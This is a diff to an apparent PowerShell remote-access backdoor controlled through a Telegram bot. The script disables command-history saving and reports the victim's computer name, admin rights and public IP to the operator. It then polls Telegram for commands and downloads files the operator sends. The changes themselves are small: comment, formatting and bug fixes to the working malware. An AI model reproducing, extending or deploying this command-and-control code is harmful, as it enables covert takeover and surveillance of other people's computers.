@@ -7,10 +7,9 @@ Set-PSReadlineOption    -HistorySaveStyle   SaveNothing
 Set-Location            -Path               $env:USERPROFILE
 Add-Type                -AssemblyName       System.Windows.Forms
 Add-type                -AssemblyName       System.Drawing
-
-
-$telegram_TOKEN             = "@TOKEN"  # your API Token
-$telegram_ID                = "@ID"     # your Telegram ID
+ 
+$telegram_TOKEN             = "@TOKEN"  # your API Token    (without the "@")
+$telegram_ID                = "@ID"     # your Telegram ID  (without the "@")
 $api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates'               -f $telegram_TOKEN
 $api_get_messages           = 'https://api.telegram.org/bot{0}/sendMessage'              -f $telegram_TOKEN
 $api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id='         -f $telegram_TOKEN
@@ -169,12 +168,12 @@ function sendMessage ($output, $message_id)
     Write-Host "Preparing for sending the output..."
     
     $MessageToSend = New-Object psobject
-    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $telegram_ID
-    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'protect_content' -Value $true
-    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'disable_web_page_preview' -Value $false
-    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'parse_mode' -Value "html"
-    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'reply_to_message_id' -Value $message_id
-    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value ("<pre>" + $output + "</pre>")
+    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id'                    -Value $telegram_ID
+    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'protect_content'            -Value $true
+    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'disable_web_page_preview'   -Value $false
+    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'parse_mode'                 -Value "html"
+    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'reply_to_message_id'        -Value $message_id
+    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text'                       -Value ("<pre>" + $output + "</pre>")
     $MessageToSend = $MessageToSend | ConvertTo-Json
 
     try {
@@ -192,7 +191,7 @@ function sendMessage ($output, $message_id)
 function commandListener 
 {
     try {
-        sendMessage ("$env:COMPUTERNAME ($env:username) Connected: " + ((Invoke-WebRequest -Uri "https://ident.me/").Content) + " [$(Get-Location)]")
+        sendMessage ("$env:COMPUTERNAME ($(checkAdminRights)) Connected with this IP: " + ((Invoke-WebRequest -Uri "https://ident.me/").Content) + " [$(Get-Location)]")
         while (Invoke-RestMethod -Method Get "api.telegram.org") 
         {
             $message    = Invoke-RestMethod -Method Get -Uri $api_get_updates
@@ -236,7 +235,7 @@ function commandListener
                     if ($document) {
                         $file_id   = $document.file_id
                         $file_name = $document.$file_name
-                        downloadDocument $file_id $document.file_name
+                        downloadDocument $file_id $file_name
                     }
                 } 
                 else {
